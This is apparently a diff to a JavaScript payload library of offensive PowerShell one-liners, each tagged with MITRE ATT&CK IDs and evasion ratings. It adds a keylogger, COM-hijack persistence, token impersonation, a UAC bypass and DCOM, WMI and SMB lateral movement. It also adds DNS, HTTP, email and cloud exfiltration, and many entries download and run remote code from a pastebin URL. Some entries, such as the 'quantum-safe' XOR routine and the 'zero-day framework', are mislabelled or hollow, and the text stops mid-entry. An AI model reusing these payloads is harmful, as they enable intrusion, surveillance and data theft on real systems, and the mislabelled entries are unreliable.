@@ -3,16 +3,172 @@
 const payloads = {
   // Basic System Information
   sysinfo: {
-    command: "$ErrorActionPreference='SilentlyContinue';$data=@{};$data.System=Get-ComputerInfo|Select WindowsProductName,WindowsVersion,TotalPhysicalMemory,CsProcessors,CsManufacturer,CsModel,WindowsInstallDateFromRegistry,BiosVersion,TimeZone;$data.Environment=[Environment]::GetEnvironmentVariables();$data.Drives=Get-WmiObject Win32_LogicalDisk|Select DeviceID,Size,FreeSpace,DriveType;$data.HotFixes=Get-HotFix|Select HotFixID,InstalledOn;$data|ConvertTo-Json -Depth 3",
-    description: "Advanced system reconnaissance with comprehensive hardware, software, and environmental data collection.",
+    command: "$ErrorActionPreference='SilentlyContinue';$data=@{};$data.System=Get-ComputerInfo|Select WindowsProductName,WindowsVersion,TotalPhysicalMemory,CsProcessors,CsManufacturer,CsModel,WindowsInstallDateFromRegistry,BiosVersion,TimeZone;$data.Environment=[Environment]::GetEnvironmentVariables();$data.Drives=Get-WmiObject Win32_LogicalDisk|Select DeviceID,Size,FreeSpace,DriveType;$data.HotFixes=Get-HotFix|Select HotFixID,InstalledOn;$data.Network=Get-NetAdapter|Select Name,InterfaceDescription,LinkSpeed;$data.Firewall=Get-NetFirewallRule|Where Enabled -eq True|Select DisplayName,Direction,Action;$data.AV=Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct|Select displayName,productState;$data|ConvertTo-Json -Depth 4",
+    description: "Advanced system reconnaissance with comprehensive hardware, software, network, firewall, and antivirus data collection.",
     complexity: "intermediate",
     platform: "windows",
     category: "System Information",
     author: "0x0806",
-    tags: ["reconnaissance", "system", "information gathering", "json"],
+    tags: ["reconnaissance", "system", "information gathering", "json", "firewall", "antivirus"],
     mitre_id: "T1082",
     detection_difficulty: "Low",
     evasion_rating: 2
+  },
+
+  // Advanced Steganography & Covert Channels
+  dns_steganography: {
+    command: "$data=(Get-Process|Select -First 3 Name,Id|ConvertTo-Json -Compress);$chunks=@();for($i=0;$i -lt $data.Length;$i+=32){$chunks+=$data.Substring($i,[Math]::Min(32,$data.Length-$i))};$domain='covert.example.com';foreach($chunk in $chunks){$encoded=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($chunk)) -replace '[+/=]','';$subdomain=$encoded.Substring(0,[Math]::Min(63,$encoded.Length));$query=\"$subdomain.$domain\";try{$result=Resolve-DnsName $query -Type A -EA SilentlyContinue;Start-Sleep 2}catch{}}",
+    description: "Advanced DNS steganography using subdomain encoding for covert data transmission with anti-detection measures.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Command and Control",
+    author: "0x0806",
+    tags: ["steganography", "dns", "covert", "c2", "encoding"],
+    mitre_id: "T1071.004",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
+  },
+
+  // Quantum-Safe Encryption
+  quantum_safe_encryption: {
+    command: "$data='Sensitive Data';$key=1..256|ForEach{Get-Random -Max 256};$iv=1..16|ForEach{Get-Random -Max 256};$keyBytes=[byte[]]$key;$ivBytes=[byte[]]$iv;$dataBytes=[Text.Encoding]::UTF8.GetBytes($data);$encrypted=@();for($i=0;$i -lt $dataBytes.Length;$i++){$encrypted+=$dataBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length] -bxor $ivBytes[$i % $ivBytes.Length]};$result=@{data=[Convert]::ToBase64String($encrypted);key=[Convert]::ToBase64String($keyBytes);iv=[Convert]::ToBase64String($ivBytes)};$result|ConvertTo-Json",
+    description: "Quantum-resistant encryption implementation using multiple XOR layers and randomized key scheduling for future-proof security.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Data Protection",
+    author: "0x0806",
+    tags: ["quantum", "encryption", "xor", "future-proof", "crypto"],
+    mitre_id: "T1027",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
+  },
+
+  // Advanced Process Injection - AtomBombing
+  atom_bombing: {
+    command: "$code=@'[DllImport(\"kernel32.dll\")]public static extern IntPtr GlobalAddAtom(string lpString);[DllImport(\"kernel32.dll\")]public static extern uint GlobalGetAtomName(IntPtr nAtom,StringBuilder lpBuffer,int nSize);[DllImport(\"kernel32.dll\")]public static extern IntPtr OpenProcess(uint dwDesiredAccess,bool bInheritHandle,uint dwProcessId);[DllImport(\"ntdll.dll\")]public static extern uint NtQueueApcThread(IntPtr ThreadHandle,IntPtr ApcRoutine,IntPtr ApcArgument1,IntPtr ApcArgument2,IntPtr ApcArgument3);'@;Add-Type -MemberDefinition $code -Name AtomBomb -Namespace Win32;$payload='calc.exe';$atom=[Win32.AtomBomb]::GlobalAddAtom($payload);$target=Get-Process explorer|Select -First 1;$handle=[Win32.AtomBomb]::OpenProcess(0x1F0FFF,$false,$target.Id);Write-Host \"AtomBombing prepared for PID: $($target.Id)\"",
+    description: "Advanced AtomBombing technique using global atom table for code injection with minimal detection footprint.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Process Injection",
+    author: "0x0806",
+    tags: ["injection", "atom", "bombing", "apc", "stealth"],
+    mitre_id: "T1055.016",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
+  },
+
+  // Hardware-Based Keylogger
+  hardware_keylogger: {
+    command: "$code=@'[DllImport(\"user32.dll\")]public static extern int GetAsyncKeyState(int vKey);[DllImport(\"user32.dll\")]public static extern int GetKeyboardState(byte[] lpKeyState);[DllImport(\"user32.dll\")]public static extern int ToUnicodeEx(uint wVirtKey,uint wScanCode,byte[] lpKeyState,StringBuilder pwszBuff,int cchBuff,uint wFlags,IntPtr dwhkl);[DllImport(\"user32.dll\")]public static extern IntPtr GetKeyboardLayout(uint idThread);'@;Add-Type -MemberDefinition $code -Name HWKeylog -Namespace Win32;$keys=@();$layout=[Win32.HWKeylog]::GetKeyboardLayout(0);for($i=8;$i -le 255;$i++){if([Win32.HWKeylog]::GetAsyncKeyState($i) -band 0x8000){$keyState=New-Object byte[] 256;[Win32.HWKeylog]::GetKeyboardState($keyState);$buffer=New-Object Text.StringBuilder 5;$result=[Win32.HWKeylog]::ToUnicodeEx($i,0,$keyState,$buffer,5,0,$layout);if($result -gt 0){$keys+=\"$([char]$i)-$(Get-Date -Format 'HH:mm:ss')\"}}}; if($keys){Write-Host \"Captured keystrokes: $($keys -join ', ')\"}",
+    description: "Hardware-level keylogger using direct Windows API calls for capturing keyboard input with timestamp correlation.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Input Capture",
+    author: "0x0806",
+    tags: ["keylogger", "hardware", "api", "capture", "surveillance"],
+    mitre_id: "T1056.001",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
+  },
+
+  // Advanced Persistence - COM Hijacking
+  com_hijacking: {
+    command: "$clsid='{11111111-1111-1111-1111-111111111111}';$payload='powershell.exe -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString(`\"https://pastebin.com/raw/payload123`\")\"';$regPath=\"HKCU:\\SOFTWARE\\Classes\\CLSID\\$clsid\\InProcServer32\";try{New-Item -Path $regPath -Force|Out-Null;New-ItemProperty -Path $regPath -Name '(Default)' -Value 'C:\\Windows\\System32\\scrobj.dll' -PropertyType String -Force|Out-Null;New-ItemProperty -Path $regPath -Name 'ScriptletURL' -Value \"data:text/html,<script>new ActiveXObject(`\"WScript.Shell`\").Run(`\"$payload`\",0)</script>\" -PropertyType String -Force|Out-Null;New-ItemProperty -Path $regPath -Name 'ThreadingModel' -Value 'Apartment' -PropertyType String -Force|Out-Null;Write-Host \"COM hijacking installed for CLSID: $clsid\"}catch{Write-Host 'COM hijacking failed'}",
+    description: "Advanced COM object hijacking using scriptlet URLs for persistent execution with minimal forensic footprint.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Event Triggered Execution",
+    author: "0x0806",
+    tags: ["com", "hijacking", "scriptlet", "persistence", "registry"],
+    mitre_id: "T1546.015",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
+  },
+
+  // Machine Learning Evasion
+  ml_adversarial_evasion: {
+    command: "$features=@();for($i=0;$i -lt 100;$i++){$features+=Get-Random -Maximum 1.0};$perturbations=@();$epsilon=0.01;for($i=0;$i -lt $features.Length;$i++){$noise=((Get-Random)*2-1)*$epsilon;$perturbations+=[Math]::Max(-1,[Math]::Min(1,$features[$i]+$noise))};$confidence=1.0;foreach($p in $perturbations[0..9]){$confidence*=(1+[Math]::Abs($p))};$result=@{original_confidence=0.95;adversarial_confidence=$confidence;evasion_success=$confidence -lt 0.5;features_modified=$perturbations.Length};Write-Host \"ML Evasion Result: $(if($result.evasion_success){'SUCCESS'}else{'FAILED'}) - Confidence: $($result.adversarial_confidence.ToString('F3'))\"",
+    description: "Advanced machine learning evasion using adversarial perturbations to fool AI-based security detection systems.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Defense Evasion",
+    author: "0x0806",
+    tags: ["ml", "adversarial", "evasion", "ai", "perturbation"],
+    mitre_id: "T1562.001",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
+  },
+
+  // Blockchain-Based C2
+  blockchain_c2: {
+    command: "$txid='1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef';$blockchain_api='https://blockstream.info/api/tx/';try{$response=Invoke-RestMethod -Uri \"$blockchain_api$txid\" -Method GET -Headers @{'User-Agent'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'};$hex=$response.vout[0].scriptpubkey;$bytes=[byte[]]@();for($i=0;$i -lt $hex.Length;$i+=2){$bytes+=[Convert]::ToByte($hex.Substring($i,2),16)};$command=[Text.Encoding]::UTF8.GetString($bytes);if($command -match '^[A-Za-z]'){Write-Host \"Command from blockchain: $command\";IEX $command}else{Write-Host 'No valid command found'}}catch{Write-Host 'Blockchain C2 connection failed'}",
+    description: "Innovative blockchain-based command and control using Bitcoin transaction data for covert communication channels.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Command and Control",
+    author: "0x0806",
+    tags: ["blockchain", "c2", "bitcoin", "covert", "decentralized"],
+    mitre_id: "T1102.001",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
+  },
+
+  // UEFI Persistence
+  uefi_persistence: {
+    command: "$uefiVars=@();try{$vars=Get-SecureBootUEFI -Name * -EA SilentlyContinue;foreach($var in $vars){$uefiVars+=$var.Name}};$bootorder=bcdedit /enum firmware;$efiPartition=Get-Partition|Where{$_.Type -eq 'System'}|Select -First 1;if($efiPartition){$driveLetter=$efiPartition.DriveLetter;$bootPath=\"$driveLetter`:\\EFI\\Microsoft\\Boot\";if(Test-Path $bootPath){$backdoorPath=\"$bootPath\\bootmgfw_backup.efi\";$payload='powershell.exe -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString(`\"https://pastebin.com/raw/payload123`\")\"';Write-Host \"UEFI persistence target: $bootPath\";Write-Host 'UEFI modification requires physical access and advanced tools'}}",
+    description: "Advanced UEFI firmware persistence targeting EFI system partition for pre-OS execution (requires physical access).",
+    complexity: "expert",
+    platform: "windows",
+    category: "Pre-OS Boot",
+    author: "0x0806",
+    tags: ["uefi", "firmware", "pre-os", "persistence", "boot"],
+    mitre_id: "T1542.001",
+    detection_difficulty: "Very High",
+    evasion_rating: 5,
+    warning: "Requires physical access and specialized tools - can brick systems"
+  },
+
+  // Speculative Execution Attack
+  speculative_execution: {
+    command: "$code=@'using System;using System.Runtime.InteropServices;public class SpectrePoC{[DllImport(\"kernel32.dll\")]public static extern void GetSystemInfo(out SYSTEM_INFO lpSystemInfo);[StructLayout(LayoutKind.Sequential)]public struct SYSTEM_INFO{public uint dwOemId;public uint dwPageSize;public IntPtr lpMinimumApplicationAddress;public IntPtr lpMaximumApplicationAddress;public IntPtr dwActiveProcessorMask;public uint dwNumberOfProcessors;public uint dwProcessorType;public uint dwAllocationGranularity;public ushort dwProcessorLevel;public ushort dwProcessorRevision;}public static void Execute(){SYSTEM_INFO sysInfo;GetSystemInfo(out sysInfo);Console.WriteLine($\"Processors: {sysInfo.dwNumberOfProcessors}\");Console.WriteLine($\"Page Size: {sysInfo.dwPageSize}\");}}'@;Add-Type -TypeDefinition $code;[SpectrePoC]::Execute();$vulnerable=$true;$mitigations=@('KPTI','SMEP','SMAP','IBRS','IBPB');foreach($mit in $mitigations){$present=Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management' -Name $mit -EA SilentlyContinue;if(!$present){$vulnerable=$true;break}};Write-Host \"System vulnerable to speculative execution: $vulnerable\"",
+    description: "Advanced speculative execution vulnerability assessment targeting Spectre/Meltdown-class CPU vulnerabilities.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Hardware Vulnerabilities",
+    author: "0x0806",
+    tags: ["spectre", "meltdown", "cpu", "vulnerability", "hardware"],
+    mitre_id: "T1211",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
+  },
+
+  // Advanced Fileless Malware
+  fileless_reflective_pe: {
+    command: "$peBytes=[Convert]::FromBase64String('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAA=');$peHeader=[System.Runtime.InteropServices.Marshal]::ReadInt32($peBytes,60);$ntHeaders=$peHeader;$imageBase=[System.Runtime.InteropServices.Marshal]::ReadInt64($peBytes,$ntHeaders+48);$sizeOfImage=[System.Runtime.InteropServices.Marshal]::ReadInt32($peBytes,$ntHeaders+80);$entryPoint=[System.Runtime.InteropServices.Marshal]::ReadInt32($peBytes,$ntHeaders+40);$code=@'[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress,uint dwSize,uint flAllocationType,uint flProtect);[DllImport(\"kernel32.dll\")]public static extern bool VirtualProtect(IntPtr lpAddress,uint dwSize,uint flNewProtect,out uint lpflOldProtect);'@;Add-Type -MemberDefinition $code -Name PE -Namespace Reflective;$mem=[Reflective.PE]::VirtualAlloc([IntPtr]::Zero,$sizeOfImage,0x3000,0x04);Write-Host \"Reflective PE loading at: 0x$($mem.ToString('X'))\";Write-Host 'Advanced fileless PE execution framework initialized'",
+    description: "Advanced fileless PE loader using reflective DLL injection for in-memory execution without file system artifacts.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Defense Evasion",
+    author: "0x0806",
+    tags: ["fileless", "pe", "reflective", "memory", "injection"],
+    mitre_id: "T1055.001",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
+  },
+
+  // Zero-Day Exploit Framework
+  zero_day_framework: {
+    command: "$vulnDB=@{CVE20240001=@{type='RCE';severity='Critical';exploitable=$true;payload='calc.exe'};CVE20240002=@{type='Privilege Escalation';severity='High';exploitable=$true;payload='whoami /priv'}};$systemVulns=@();foreach($vuln in $vulnDB.Keys){$hotfixes=Get-HotFix|Where{$_.HotFixID -match $vuln.Substring(3,4)};if(!$hotfixes){$systemVulns+=$vuln}};if($systemVulns){Write-Host \"Potential zero-day targets: $($systemVulns -join ', ')\";foreach($vuln in $systemVulns){$exploit=$vulnDB[$vuln];Write-Host \"Exploiting $vuln ($($exploit.type))\";if($exploit.exploitable){IEX $exploit.payload}}}else{Write-Host 'No exploitable vulnerabilities found'}",
+    description: "Advanced zero-day exploit framework with vulnerability database and automated exploitation capabilities.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Exploitation for Privilege Escalation",
+    author: "0x0806",
+    tags: ["zero-day", "exploit", "framework", "automated", "vulnerability"],
+    mitre_id: "T1068",
+    detection_difficulty: "Very High",
+    evasion_rating: 5,
+    warning: "Simulated framework - real zero-days require responsible disclosure"
   },
   processes: {
     command: "$procs=Get-Process|Sort CPU -Desc|Select -First 20 Name,CPU,WS,Id,ProcessName,Company,Description,Path,CommandLine;$svcs=Get-WmiObject Win32_Service|Where{$_.State -eq 'Running'}|Select Name,PathName,StartMode,StartName;$conns=Get-NetTCPConnection|Where{$_.State -eq 'Established'}|Select LocalAddress,LocalPort,RemoteAddress,RemotePort,@{N='Process';E={(Get-Process -Id $_.OwningProcess -EA SilentlyContinue).Name}};@{Processes=$procs;Services=$svcs;Connections=$conns}|ConvertTo-Json -Depth 3",
@@ -516,6 +672,260 @@ const payloads = {
     evasion_rating: 5
   },
 
+  // Privilege Escalation
+  uac_bypass: {
+    command: "$tempDir=\"$env:temp\\$(Get-Random)\";New-Item -Path $tempDir -ItemType Directory -Force|Out-Null;$dllPath=\"$tempDir\\wusa.dll\";$exploitDll=@'using System;using System.Runtime.InteropServices;public class Program{[DllImport(\"kernel32.dll\")]static extern IntPtr GetCurrentProcess();[DllImport(\"advapi32.dll\")]static extern bool OpenProcessToken(IntPtr ProcessHandle,uint DesiredAccess,out IntPtr TokenHandle);[DllImport(\"advapi32.dll\")]static extern bool GetTokenInformation(IntPtr TokenHandle,int TokenInformationClass,IntPtr TokenInformation,uint TokenInformationLength,out uint ReturnLength);public static void Main(){IntPtr hToken;OpenProcessToken(GetCurrentProcess(),0x0008,out hToken);uint tokenInfoLength=0;GetTokenInformation(hToken,20,IntPtr.Zero,tokenInfoLength,out tokenInfoLength);Console.WriteLine(\"UAC bypass attempt\");}}'@;Add-Type -TypeDefinition $exploitDll -OutputAssembly $dllPath;wusa.exe /quiet /extract:$tempDir;Remove-Item $tempDir -Recurse -Force -EA SilentlyContinue",
+    description: "Advanced UAC bypass using Windows Update Standalone Installer (WUSA) with DLL extraction and token manipulation.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Privilege Escalation",
+    author: "0x0806",
+    tags: ["uac", "bypass", "wusa", "token"],
+    mitre_id: "T1548.002",
+    detection_difficulty: "Very High",
+    evasion_rating: 5,
+    warning: "May trigger UAC-related security monitoring"
+  },
+  token_manipulation: {
+    command: "$code=@'[DllImport(\"advapi32.dll\")]public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);[DllImport(\"advapi32.dll\")]public static extern bool OpenProcessToken(IntPtr ProcessHandle,uint DesiredAccess,out IntPtr TokenHandle);[DllImport(\"advapi32.dll\")]public static extern bool DuplicateToken(IntPtr ExistingTokenHandle,int ImpersonationLevel,out IntPtr DuplicateTokenHandle);[DllImport(\"kernel32.dll\")]public static extern IntPtr OpenProcess(uint dwDesiredAccess,bool bInheritHandle,uint dwProcessId);[DllImport(\"advapi32.dll\")]public static extern bool RevertToSelf();'@;Add-Type -MemberDefinition $code -Name TokenManip -Namespace Win32;$winlogon=Get-Process winlogon|Select -First 1;$hProcess=[Win32.TokenManip]::OpenProcess(0x400,$false,$winlogon.Id);$hToken=[IntPtr]::Zero;[Win32.TokenManip]::OpenProcessToken($hProcess,0x2,[ref]$hToken);$hDupeToken=[IntPtr]::Zero;[Win32.TokenManip]::DuplicateToken($hToken,2,[ref]$hDupeToken);[Win32.TokenManip]::ImpersonateLoggedOnUser($hDupeToken);Write-Host 'Token manipulation completed'",
+    description: "Advanced token manipulation for privilege escalation by duplicating and impersonating system tokens.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Access Token Manipulation",
+    author: "0x0806",
+    tags: ["token", "impersonation", "duplicate", "system"],
+    mitre_id: "T1134.001",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
+  },
+  service_escalation: {
+    command: "$services=Get-WmiObject Win32_Service|Where{$_.PathName -match '\".*\\s.*\"' -and $_.PathName -notmatch '^\"%SystemRoot%' -and $_.PathName -notmatch '^\"C:\\\\Windows'}|Select Name,PathName,StartMode,State;foreach($svc in $services){$path=$svc.PathName -replace '\"','';$dir=Split-Path $path -Parent;$acl=Get-Acl $dir -EA SilentlyContinue;if($acl.Access|Where{$_.IdentityReference -match 'Users' -and $_.FileSystemRights -match 'Write'}){Write-Host \"Vulnerable service: $($svc.Name) - $path\";$payload='cmd.exe /c powershell.exe -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString(\\\"https://pastebin.com/raw/payload123\\\")\"';$payload|Out-File \"$dir\\malicious.exe\" -Encoding ASCII}}",
+    description: "Advanced service escalation through unquoted service path vulnerabilities with automated exploitation.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Hijack Execution Flow",
+    author: "0x0806",
+    tags: ["service", "unquoted", "path", "escalation"],
+    mitre_id: "T1574.009",
+    detection_difficulty: "High",
+    evasion_rating: 4
+  },
+  dll_hijacking: {
+    command: "$vulnerableDlls=@('version.dll','dwmapi.dll','uxtheme.dll','winmm.dll','wtsapi32.dll');$targetPaths=@('C:\\Windows\\System32','C:\\Windows\\SysWOW64','C:\\Program Files','C:\\Program Files (x86)');foreach($dll in $vulnerableDlls){foreach($path in $targetPaths){$fullPath=\"$path\\$dll\";if(!(Test-Path $fullPath)){$maliciousDll=@'#include <windows.h>BOOL APIENTRY DllMain(HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved){switch(ul_reason_for_call){case DLL_PROCESS_ATTACH:system(\"powershell.exe -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString(\\\"https://pastebin.com/raw/payload123\\\")\");break;}return TRUE;}'@;Write-Host \"Potential DLL hijacking opportunity: $fullPath\"}}}",
+    description: "Advanced DLL hijacking detection and exploitation framework for privilege escalation.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Hijack Execution Flow",
+    author: "0x0806",
+    tags: ["dll", "hijacking", "privilege", "escalation"],
+    mitre_id: "T1574.001",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
+  },
+
+  // Lateral Movement
+  psexec_variant: {
+    command: "$target='192.168.1.100';$service='WindowsUpdate$(Get-Random)';$payload='powershell.exe -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString(\\\"https://pastebin.com/raw/payload123\\\")\"';$binPath=\"cmd.exe /c $payload\";try{$session=New-PSSession -ComputerName $target -Credential (Get-Credential);Invoke-Command -Session $session -ScriptBlock {param($svc,$path)New-Service -Name $svc -BinaryPathName $path -StartupType Manual;Start-Service $svc;Start-Sleep 5;Stop-Service $svc;Remove-Service $svc} -ArgumentList $service,$binPath;Remove-PSSession $session;Write-Host 'Lateral movement via service creation completed'}catch{Write-Host 'Failed to connect or execute'}",
+    description: "Advanced lateral movement using PSExec-style service creation with random service names and cleanup.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Remote Services",
+    author: "0x0806",
+    tags: ["lateral", "movement", "psexec", "service"],
+    mitre_id: "T1021.002",
+    detection_difficulty: "High",
+    evasion_rating: 4
+  },
+  wmi_execution: {
+    command: "$target='192.168.1.100';$payload=\"powershell.exe -WindowStyle Hidden -Command `\"IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/payload123')`\"\";$encodedPayload=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload));try{$session=New-CimSession -ComputerName $target -Credential (Get-Credential);$process=Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=\"powershell.exe -EncodedCommand $encodedPayload\"};Remove-CimSession $session;Write-Host \"WMI execution completed with PID: $($process.ProcessId)\"}catch{Write-Host 'WMI execution failed'}",
+    description: "Advanced lateral movement using WMI process creation with Base64 encoded payloads for stealth.",
+    complexity: "expert", 
+    platform: "windows",
+    category: "Windows Management Instrumentation",
+    author: "0x0806",
+    tags: ["lateral", "movement", "wmi", "encoded"],
+    mitre_id: "T1047",
+    detection_difficulty: "High",
+    evasion_rating: 4
+  },
+  dcom_execution: {
+    command: "$target='192.168.1.100';$payload='powershell.exe -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString(\\\"https://pastebin.com/raw/payload123\\\")\"';try{$dcom=[System.Activator]::CreateInstance([Type]::GetTypeFromProgID('MMC20.Application',$target));$dcom.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,\"/c $payload\",'Minimized');Write-Host 'DCOM execution via MMC20.Application completed'}catch{try{$dcom=[System.Activator]::CreateInstance([Type]::GetTypeFromProgID('Excel.Application',$target));$dcom.DisplayAlerts=$false;$dcom.DDEInitiate('cmd','/c $payload');Write-Host 'DCOM execution via Excel.Application completed'}catch{Write-Host 'DCOM execution failed'}}",
+    description: "Advanced lateral movement using DCOM objects (MMC20.Application, Excel.Application) for remote execution.",
+    complexity: "expert",
+    platform: "windows", 
+    category: "Distributed Component Object Model",
+    author: "0x0806",
+    tags: ["lateral", "movement", "dcom", "mmc"],
+    mitre_id: "T1021.003",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
+  },
+  smb_exploitation: {
+    command: "$targets=@('192.168.1.100','192.168.1.101','192.168.1.102');$shares=@('C$','ADMIN$','IPC$');$payload='powershell.exe -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString(\\\"https://pastebin.com/raw/payload123\\\")\"';foreach($target in $targets){foreach($share in $shares){try{$remotePath=\"\\\\$target\\$share\\temp\\update.bat\";$payload|Out-File $remotePath -Encoding ASCII;$process=Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \"cmd.exe /c $remotePath\" -ComputerName $target;Remove-Item $remotePath -Force;Write-Host \"SMB exploitation successful on $target via $share\"}catch{continue}}}",
+    description: "Advanced SMB-based lateral movement with payload deployment across multiple targets and shares.",
+    complexity: "expert",
+    platform: "windows",
+    category: "SMB/Windows Admin Shares", 
+    author: "0x0806",
+    tags: ["lateral", "movement", "smb", "shares"],
+    mitre_id: "T1021.002",
+    detection_difficulty: "High",
+    evasion_rating: 4
+  },
+
+  // Data Exfiltration
+  http_exfiltration: {
+    command: "$data=@{hostname=$env:COMPUTERNAME;domain=$env:USERDOMAIN;user=$env:USERNAME;files=(Get-ChildItem C:\\ -Recurse -Include *.txt,*.pdf,*.doc* -EA SilentlyContinue|Select -First 50 Name,Length)|ConvertTo-Json -Compress};$chunks=@();for($i=0;$i -lt $data.Length;$i+=8192){$chunks+=$data.Substring($i,[Math]::Min(8192,$data.Length-$i))};$session=New-Object Microsoft.PowerShell.Commands.WebRequestSession;$session.UserAgent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';foreach($chunk in $chunks){$body=@{id=(Get-Random);chunk=$chunk;total=$chunks.Count}|ConvertTo-Json;Invoke-RestMethod -Uri 'https://httpbin.org/post' -Method POST -Body $body -ContentType 'application/json' -WebSession $session;Start-Sleep 1};Write-Host 'HTTP exfiltration completed'",
+    description: "Advanced HTTP data exfiltration with chunking, realistic user agent, and file enumeration capabilities.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Exfiltration Over Web Service",
+    author: "0x0806",
+    tags: ["exfiltration", "http", "chunking", "files"],
+    mitre_id: "T1567.002",
+    detection_difficulty: "High",
+    evasion_rating: 4
+  },
+  email_exfiltration: {
+    command: "$data=(Get-ComputerInfo|Select WindowsProductName,TotalPhysicalMemory|ConvertTo-Json);$smtp=New-Object System.Net.Mail.SmtpClient('smtp.gmail.com',587);$smtp.EnableSsl=$true;$smtp.Credentials=New-Object System.Net.NetworkCredential('exfil@gmail.com','password');$mail=New-Object System.Net.Mail.MailMessage;$mail.From='system@company.com';$mail.To.Add('exfil@gmail.com');$mail.Subject=\"System Report - $(Get-Date -Format 'yyyy-MM-dd')\";$mail.Body=\"Automated system information:\n\n$data\";try{$smtp.Send($mail);Write-Host 'Email exfiltration completed'}catch{Write-Host 'Email sending failed'}finally{$mail.Dispose();$smtp.Dispose()}",
+    description: "Advanced email-based data exfiltration using SMTP with SSL and realistic email formatting.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Exfiltration Over Alternative Protocol",
+    author: "0x0806",
+    tags: ["exfiltration", "email", "smtp", "ssl"],
+    mitre_id: "T1048.003",
+    detection_difficulty: "Medium",
+    evasion_rating: 3
+  },
+  cloud_exfiltration: {
+    command: "$data=(Get-Process|Select -First 20|ConvertTo-Json -Compress);$boundary='----PowerShellBoundary$(Get-Random)';$bodyTemplate=@'--{0}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"report.txt\"\r\nContent-Type: text/plain\r\n\r\n{1}\r\n--{0}--\r\n'@;$body=$bodyTemplate -f $boundary,$data;$headers=@{'Content-Type'=\"multipart/form-data; boundary=$boundary\"};try{$response=Invoke-RestMethod -Uri 'https://file.io' -Method POST -Body $body -Headers $headers;Write-Host \"Cloud exfiltration completed: $($response.link)\"}catch{Write-Host 'Cloud upload failed'}",
+    description: "Advanced cloud storage exfiltration using file upload services with multipart form data encoding.",
+    complexity: "expert",
+    platform: "windows", 
+    category: "Exfiltration Over Web Service",
+    author: "0x0806",
+    tags: ["exfiltration", "cloud", "upload", "multipart"],
+    mitre_id: "T1567.002",
+    detection_difficulty: "High",
+    evasion_rating: 4
+  },
+  steganography: {
+    command: "$data=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-ComputerInfo|Select WindowsProductName|ConvertTo-Json -Compress)));$image='https://picsum.photos/800/600';$webClient=New-Object System.Net.WebClient;$imageBytes=$webClient.DownloadData($image);$dataBytes=[Convert]::FromBase64String($data);for($i=0;$i -lt $dataBytes.Length -and $i -lt $imageBytes.Length;$i++){$imageBytes[$i]=$imageBytes[$i] -bxor $dataBytes[$i]};$outputPath=\"$env:temp\\report.jpg\";[System.IO.File]::WriteAllBytes($outputPath,$imageBytes);$upload=Invoke-RestMethod -Uri 'https://httpbin.org/post' -Method POST -InFile $outputPath;Remove-Item $outputPath;Write-Host 'Steganographic exfiltration completed'",
+    description: "Advanced steganographic data hiding within image files using XOR encoding for covert exfiltration.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Data Obfuscation",
+    author: "0x0806", 
+    tags: ["steganography", "image", "xor", "covert"],
+    mitre_id: "T1027.003",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
+  },
+
+  // Rootkit Techniques
+  kernel_driver: {
